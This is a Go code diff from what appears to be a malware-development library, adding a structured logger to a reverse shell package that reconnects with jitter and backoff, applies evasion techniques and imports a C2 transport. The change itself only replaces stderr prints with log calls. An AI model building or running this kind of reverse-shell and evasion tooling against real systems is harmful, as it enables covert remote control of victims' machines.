@@ -15,6 +15,7 @@ import (
 
 	"github.com/oioio-space/maldev/c2/transport"
 	"github.com/oioio-space/maldev/evasion"
+	"github.com/oioio-space/maldev/internal/log"
 )
 
 // Config contains shell configuration.
@@ -47,6 +48,10 @@ type Config struct {
 	// JitterFactor controls the random jitter applied to reconnect delays.
 	// 0.25 means +/-25% (default). Set to 0 to disable jitter.
 	JitterFactor float64
+
+	// Logger receives structured log messages. Nil = no logging.
+	// In release builds (without -tags debug), logging is eliminated at compile time.
+	Logger *log.Logger
 }
 
 // DefaultConfig returns a sensible default configuration.
@@ -66,6 +71,13 @@ func DefaultConfig() *Config {
 	}
 }
 
+func resolveLogger(l *log.Logger) *log.Logger {
+	if l != nil {
+		return l
+	}
+	return log.Nop()
+}
+
 // Shell represents a reverse shell instance with automatic reconnection.
 // Lifecycle is managed by an internal state machine with phases:
 // Idle → Connecting → Connected → Running → Reconnecting → Stopped.
@@ -73,6 +85,7 @@ type Shell struct {
 	config    *Config
 	transport transport.Transport
 	sm        *stateMachine
+	log       *log.Logger
 }
 
 // New creates a new Shell with the given transport and config.
@@ -85,6 +98,7 @@ func New(trans transport.Transport, cfg *Config) *Shell {
 		config:    cfg,
 		transport: trans,
 		sm:        newStateMachine(),
+		log:       resolveLogger(cfg.Logger),
 	}
 }
 
@@ -112,7 +126,7 @@ func (s *Shell) Start(ctx context.Context) error {
 	// Apply evasion techniques if configured.
 	if len(s.config.Evasion) > 0 {
 		if err := applyEvasion(s.config.Evasion, s.config.Caller); err != nil {
-			fmt.Fprintf(os.Stderr, "[!] Evasion: %v\n", err)
+			s.log.Warn("evasion failed", "error", err)
 		}
 	}
 
@@ -136,7 +150,7 @@ func (s *Shell) reconnectLoop(ctx context.Context) error {
 	// First connection attempt is immediate.
 	if err := s.attemptSession(ctx); err != nil {
 		retries++
-		fmt.Fprintf(os.Stderr, "[!] Attempt %d failed: %v\n", retries, err)
+		s.log.Warn("connection attempt failed", "attempt", retries, "error", err)
 
 		if s.shouldStop(retries) {
 			return fmt.Errorf("max retries (%d) exceeded", s.config.MaxRetries)
@@ -173,7 +187,7 @@ func (s *Shell) reconnectLoop(ctx context.Context) error {
 
 			if err := s.attemptSession(ctx); err != nil {
 				retries++
-				fmt.Fprintf(os.Stderr, "[!] Attempt %d failed: %v\n", retries, err)
+				s.log.Warn("connection attempt failed", "attempt", retries, "error", err)
 				currentWait = currentWait * 2
 				if currentWait > maxWait {
 					currentWait = maxWait
